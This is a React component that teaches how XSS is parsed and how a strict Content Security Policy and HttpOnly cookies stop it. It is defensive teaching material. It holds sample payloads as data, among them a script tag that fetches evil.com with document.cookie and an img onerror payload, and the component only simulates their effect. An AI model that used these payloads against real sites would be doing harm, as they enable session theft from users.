import React, { useState } from 'react';
import { ShieldCheck, Code2, Cookie, Terminal } from 'lucide-react';

interface Props {
  currentStep: number;
}

export const XssCspVisualizer: React.FC<Props> = ({ currentStep: _currentStep }) => {
  const [payload, setPayload] = useState(
    '<script>fetch("https://evil.com/steal?c=" + document.cookie)</script>'
  );
  const [httpOnly, setHttpOnly] = useState(true);
  const [cspMode, setCspMode] = useState<'disabled' | 'strict'>('strict');

  const hasScriptTag =
    payload.toLowerCase().includes('<script') || payload.toLowerCase().includes('onerror=');

  // Outcome logic:
  // If no script tag: clean
  // If script tag present:
  //   - If CSP is strict: CSP blocks execution entirely!
  //   - If CSP is disabled: script executes!
  //     - If HttpOnly is true: cookie is empty, so stolen cookie is empty.
  //     - If HttpOnly is false: attacker steals full session_id!
  const isExecuted = hasScriptTag && cspMode === 'disabled';
  const isCspBlocked = hasScriptTag && cspMode === 'strict';
  const isCookieStolen = isExecuted && !httpOnly;

  return (
    <div className="w-full bg-parchment-50 dark:bg-parchment-900 border border-parchment-200 dark:border-parchment-800 rounded-2xl p-6 shadow-sm">
      {/* Header and Controls */}
      <div className="flex flex-wrap items-center justify-between gap-4 pb-5 border-b border-parchment-200 dark:border-parchment-800">
        <div>
          <span className="text-xs font-mono uppercase tracking-wider text-parchment-400 dark:text-parchment-400">
            DOM Execution & Browser Sandboxing
          </span>
          <h3 className="text-xl font-serif font-semibold text-ink-light dark:text-ink-dark flex items-center gap-2">
            XSS Injection vs. Content Security Policy (CSP)
          </h3>
        </div>

        {/* Defense Toggles */}
        <div className="flex flex-wrap items-center gap-2">
          {/* HttpOnly Toggle */}
          <button
            onClick={() => setHttpOnly(!httpOnly)}
            className={`px-3 py-1.5 text-xs font-mono font-medium rounded-lg border transition-all flex items-center gap-1.5 ${
              httpOnly
                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-700 dark:text-emerald-400'
                : 'bg-red-500/10 border-red-500/30 text-red-700 dark:text-red-400'
            }`}
          >
            <Cookie className="w-3.5 h-3.5" />
            Cookie HttpOnly: {httpOnly ? 'ENABLED (Shielded)' : 'DISABLED (Readable)'}
          </button>

          {/* CSP Mode */}
          <button
            onClick={() => setCspMode(cspMode === 'strict' ? 'disabled' : 'strict')}
            className={`px-3 py-1.5 text-xs font-mono font-medium rounded-lg border transition-all flex items-center gap-1.5 ${
              cspMode === 'strict'
                ? 'bg-blue-500/10 border-blue-500/30 text-blue-700 dark:text-blue-400'
                : 'bg-red-500/10 border-red-500/30 text-red-700 dark:text-red-400'
            }`}
          >
            <ShieldCheck className="w-3.5 h-3.5" />
            CSP: {cspMode === 'strict' ? "STRICT (script-src 'self')" : 'DISABLED'}
          </button>
        </div>
      </div>

      {/* Input Playground */}
      <div className="my-5 space-y-3">
        <div className="flex items-center justify-between text-xs font-mono">
          <span className="text-ink-muted dark:text-ink-darkMuted flex items-center gap-1">
            <Code2 className="w-3.5 h-3.5 text-purple-500" /> Untrusted User Input (e.g. Comment
            Field):
          </span>
          <div className="flex items-center gap-2">
            <button
              onClick={() => setPayload('Great article, really enjoyed the breakdown!')}
              className="text-[11px] text-ink-muted hover:text-ink-light underline"
            >
              Clean text
            </button>
            <span className="text-parchment-400">•</span>
            <button
              onClick={() =>
                setPayload('<script>fetch("https://evil.com/steal?c=" + document.cookie)</script>')
              }
              className="text-[11px] text-red-600 dark:text-red-400 underline font-semibold"
            >
              Load Script Payload
            </button>
            <span className="text-parchment-400">•</span>
            <button
              onClick={() => setPayload('<img src=x onerror="alert(document.cookie)" />')}
              className="text-[11px] text-amber-600 dark:text-amber-400 underline font-semibold"
            >
              Load img onerror
            </button>
          </div>
        </div>

        <input
          type="text"
          value={payload}
          onChange={(e) => setPayload(e.target.value)}
          className="w-full px-3 py-2 text-xs font-mono rounded-xl bg-white dark:bg-parchment-950 border border-parchment-200 dark:border-parchment-800 text-ink-light dark:text-ink-dark focus:outline-none focus:ring-2 focus:ring-purple-500/40"
        />
      </div>

      {/* DOM Parsing Pipeline & Execution Model */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 my-5">
        {/* Step 1: HTML Tokenizer */}
        <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950">
          <div className="text-xs font-mono font-bold uppercase text-ink-muted dark:text-ink-darkMuted mb-2">
            1. HTML Tokenizer
          </div>
          <div className="text-[11px] text-ink-muted dark:text-ink-darkMuted space-y-2">
            {hasScriptTag ? (
              <div className="p-2 bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-900/40 rounded text-red-700 dark:text-red-300 font-mono text-[10px]">
                TAG_OPEN: &lt;script&gt; detected.
                <br />
                Parser switches from DATA state to SCRIPT_DATA state.
              </div>
            ) : (
              <div className="p-2 bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-200 dark:border-emerald-900/40 rounded text-emerald-700 dark:text-emerald-300 font-mono text-[10px]">
                CHARACTER_DATA: treated as safe text node.
              </div>
            )}
            <div className="text-[10px]">
              Vulnerability root cause: `element.innerHTML` invokes the browser HTML parser
              directly.
            </div>
          </div>
        </div>

        {/* Step 2: CSP Engine Inspection */}
        <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950">
          <div className="text-xs font-mono font-bold uppercase text-ink-muted dark:text-ink-darkMuted mb-2">
            2. CSP Engine Gate
          </div>
          <div className="text-[11px] text-ink-muted dark:text-ink-darkMuted space-y-2">
            {cspMode === 'strict' ? (
              <div className="p-2 bg-blue-50 dark:bg-blue-950/30 border border-blue-200 dark:border-blue-900/40 rounded text-blue-700 dark:text-blue-300 font-mono text-[10px]">
                CSP ACTIVE: script-src &apos;self&apos;
                <br />
                Inline scripts lack valid nonce -&gt; BLOCKED!
              </div>
            ) : (
              <div className="p-2 bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-900/40 rounded text-amber-700 dark:text-amber-300 font-mono text-[10px]">
                CSP INACTIVE: All inline scripts allowed to execute without restriction.
              </div>
            )}
            <div className="text-[10px]">
              CSP acts as a defense-in-depth sandbox enforced by the browser kernel.
            </div>
          </div>
        </div>

        {/* Step 3: JS Engine & Memory Access */}
        <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950">
          <div className="text-xs font-mono font-bold uppercase text-ink-muted dark:text-ink-darkMuted mb-2">
            3. JS Memory & Cookies
          </div>
          <div className="text-[11px] text-ink-muted dark:text-ink-darkMuted space-y-2">
            <div className="p-2 bg-parchment-100 dark:bg-parchment-900 rounded font-mono text-[10px]">
              document.cookie = {httpOnly ? '"" (Hidden by HttpOnly)' : '"session_id=bank_99812"'}
            </div>
            <div className="text-[10px]">
              {httpOnly
                ? 'HttpOnly prevents document.cookie exfiltration even if JS executes.'
                : 'Session cookies exposed to any script running on the page.'}
            </div>
          </div>
        </div>
      </div>

      {/* Simulated Browser Developer Console */}
      <div className="p-4 rounded-xl bg-parchment-950 text-white font-mono text-xs border border-parchment-800">
        <div className="flex items-center justify-between pb-2 mb-2 border-b border-parchment-800 text-parchment-400 text-[10px]">
          <span className="flex items-center gap-1.5">
            <Terminal className="w-3.5 h-3.5" /> Browser Developer Console
          </span>
          <span>
            Status: {isCookieStolen ? 'PWNED' : isCspBlocked ? 'PROTECTED BY CSP' : 'SAFE'}
          </span>
        </div>

        <div className="space-y-1 text-[11px]">
          {isCspBlocked && (
            <div className="text-red-400 font-mono">
              [Report Only] Refused to execute inline script because it violates the following
              Content Security Policy directive: &quot;script-src &apos;self&apos;&quot;. Either the
              &apos;unsafe-inline&apos; keyword, a hash, or a nonce is required to enable inline
              execution.
            </div>
          )}

          {isExecuted && !httpOnly && (
            <div className="text-red-400 font-mono">
              [XSS EXPLOIT SUCCESS] Exfiltrated session cookie: &quot;session_id=bank_99812&quot; to
              https://evil.com/steal
            </div>
          )}

          {isExecuted && httpOnly && (
            <div className="text-amber-400 font-mono">
              [Warning] Script executed, but document.cookie was empty (HttpOnly active). Attacker
              cannot read session cookie directly.
            </div>
          )}

          {!hasScriptTag && (
            <div className="text-emerald-400 font-mono">
              [Info] Text rendered safely as text node. No script execution triggered.
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
